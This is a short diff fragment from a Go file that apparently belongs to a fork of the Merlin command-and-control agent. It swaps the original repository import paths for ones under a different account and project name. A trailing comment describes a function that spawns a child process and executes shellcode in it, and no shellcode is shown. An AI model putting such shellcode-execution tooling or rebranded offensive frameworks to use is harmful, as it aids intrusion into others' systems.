@@ -26,10 +26,10 @@ import (
 	"strconv"
 
 	// Merlin Main
-	"github.com/Ne0nd0g/merlin/pkg/jobs"
+	"github.com/testtoto1337/merzhin/pkg/jobs"
 
 	// Internal
-	"github.com/Ne0nd0g/merlin-agent/cli"
+	"github.com/testtoto1337/merzhin-agent/cli"
 )
 
 // CreateProcess spawns a child process with anonymous pipes, executes shellcode in it, and returns the output from the executed shellcode
